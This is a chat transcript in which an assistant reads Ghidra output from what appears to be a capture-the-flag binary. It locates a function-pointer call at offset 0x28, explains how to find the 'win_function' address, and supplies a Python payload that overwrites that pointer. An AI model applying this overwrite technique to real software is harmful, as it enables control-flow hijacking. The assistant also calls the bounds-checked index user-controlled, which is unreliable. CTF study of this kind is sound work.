@@ -1,0 +1,133 @@
+> void FUN_0040158f(void)
+
+  {
+    char *pcVar1;
+    long lVar2;
+    int iVar3;
+    char *local_30;
+    char local_22 [18];
+    
+    printf("Enter account ID to view: ");
+    fflush(stdout);
+    pcVar1 = fgets(local_22,10,stdin);
+    if (pcVar1 == (char *)0x0) {
+      puts("Invalid input");
+    }
+    else {
+      lVar2 = strtol(local_22,&local_30,10);
+      if ((local_30 == local_22) || ((*local_30 != '\n' && (*local_30 != '\0')))) {
+        puts("Invalid input - please enter a valid number");
+      }
+      else {
+        iVar3 = (int)lVar2;
+        if ((iVar3 < 0) || ((DAT_004040a0 <= iVar3 || ((&DAT_004040c0)[iVar3] == 0)))) {
+          puts("Invalid account ID");
+        }
+        else {
+          puts("\n=== Account Information ===");
+          (**(code **)((&DAT_004040c0)[iVar3] + 0x28))((&DAT_004040c0)[iVar3]);
+          puts("===========================\n");
+        }
+      }
+    }
+    return;
+  } i found this in ghidra, how can i know which trigger the vuln mechanism
+
+● Perfect! You found the view_account() function in Ghidra's decompiled output. Let me show you how to identify
+  the vulnerable line:
+
+  The Key Vulnerable Line:
+
+  (**(code **)((&DAT_004040c0)[iVar3] + 0x28))((&DAT_004040c0)[iVar3]);
+
+  This is the function pointer call that triggers the vulnerability!
+
+  Breaking Down the Assembly:
+
+  Understanding the Variables:
+
+  - DAT_004040c0 = The accounts array in memory
+  - iVar3 = The account ID (index)
+  - 0x28 = Offset to the function pointer in the struct
+
+  The Struct Layout:
+
+  struct account {
+      char name[32];           // Offset 0x00 to 0x1F (32 bytes)
+      unsigned long balance;   // Offset 0x20 to 0x27 (8 bytes)
+      void (*print_balance)(); // Offset 0x28 to 0x2F (8 bytes) ← THIS ONE!
+      void (*transfer_funds)();// Offset 0x30 to 0x37 (8 bytes)
+  };
+
+  Decoding the Vulnerable Call:
+
+  // Original C code:
+  accounts[iVar3]->print_balance(accounts[iVar3]);
+
+  // What Ghidra shows:
+  (**(code **)((&DAT_004040c0)[iVar3] + 0x28))((&DAT_004040c0)[iVar3]);
+
+  Breaking it down:
+  1. (&DAT_004040c0)[iVar3] = accounts[iVar3] (get the account pointer)
+  2. + 0x28 = Add 40 bytes to reach the print_balance function pointer
+  3. **(code **) = Dereference to get the function address
+  4. (...) = Call the function with accounts[iVar3] as parameter
+
+  How to Find the Address of win_function:
+
+  Method 1: Look in Ghidra's Function Window
+
+  1. Open Window → Functions
+  2. Look for win_function (might be named FUN_xxxxxxxx)
+  3. Note the address (e.g., 0x00401234)
+
+  Method 2: Check the Symbol Tree
+
+  1. In Ghidra's Symbol Tree
+  2. Expand Functions
+  3. Find win_function and note its address
+
+  Method 3: Look for the Flag String
+
+  Search for the string "Access granted to secure vault system":
+  1. Search → Memory (or press S)
+  2. Search for text: "Access granted"
+  3. Double-click the result
+  4. Look at the function containing this string - that's win_function
+
+  The Exploit Payload Structure:
+
+  Now you know the function pointer is at offset 0x28 (40 bytes) in the struct:
+
+  import struct
+
+  # win_function address (replace with actual address from Ghidra)
+  win_addr = 0x00401234
+
+  payload = b""
+  payload += b"A" * 32                    # name field (32 bytes)
+  payload += struct.pack("<Q", 1337)      # balance field (8 bytes)
+  payload += struct.pack("<Q", win_addr)  # print_balance pointer (8 bytes)
+  payload += struct.pack("<Q", win_addr)  # transfer_funds pointer (8 bytes)
+
+  Finding win_function Address in Ghidra:
+
+  Look for a function that contains these strings:
+  - "Access granted to secure vault system"
+  - "Retrieving classified data"
+  - "Data retrieved:"
+
+  That function's start address is what you need for your exploit!
+
+  Verification:
+
+  The vulnerable call (**(code **)((&DAT_004040c0)[iVar3] + 0x28)) confirms:
+  1. It's calling a function pointer (the **(code **) part)
+  2. At offset 0x28 (40 bytes into the struct)
+  3. From the accounts array (DAT_004040c0)
+  4. Using user-controlled index (iVar3)
+
+  When you overwrite that function pointer with win_function's address, this call will jump to win_function
+  instead of show_balance!
+
+  Find the address of the function containing "Access granted" and use that in your payload!
